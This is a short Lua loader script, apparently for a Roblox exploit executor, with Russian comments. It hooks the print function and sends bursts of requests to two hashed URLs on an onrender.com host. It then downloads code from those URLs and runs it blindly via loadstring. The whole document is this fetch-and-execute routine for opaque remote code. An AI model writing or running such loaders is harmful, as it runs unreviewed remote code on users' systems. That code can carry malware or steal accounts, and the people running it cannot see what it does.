local warmup_url = "https://protected-roblox-scripts.onrender.com/a999a85097e0ea3d10c0917c2860003e"
local main_url = "https://protected-roblox-scripts.onrender.com/3d663091bfda9b10e15d7c29cf0595d1"

local _old_print = print
local _warmup_printed = false
print = function(...)
    local msg = table.concat({...}, " ")
    if msg:find("loading...") then
        _warmup_printed = true
    end
    _old_print(...)
end

-- 1. Burst: 10 ping-запросов подряд (без ожидания)
for i = 1, 10 do
    pcall(function()
        game:HttpGet(warmup_url)
    end)
end

-- 2. Выполнить warmup-скрипт до 5 раз, но если print("loading...") найден — сразу выходим и запускаем основной скрипт
for i = 1, 5 do
    if _warmup_printed then break end
    pcall(function()
        local warmup_code = game:HttpGet(warmup_url)
        if warmup_code and #warmup_code > 0 then
            loadstring(warmup_code)()
        end
    end)
    if _warmup_printed then break end
    wait(0.5)
end

-- 3. Сразу выполняем основной скрипт
pcall(function()
    local main_code = game:HttpGet(main_url)
    if main_code and #main_code > 0 then
        loadstring(main_code)()
    end
end)
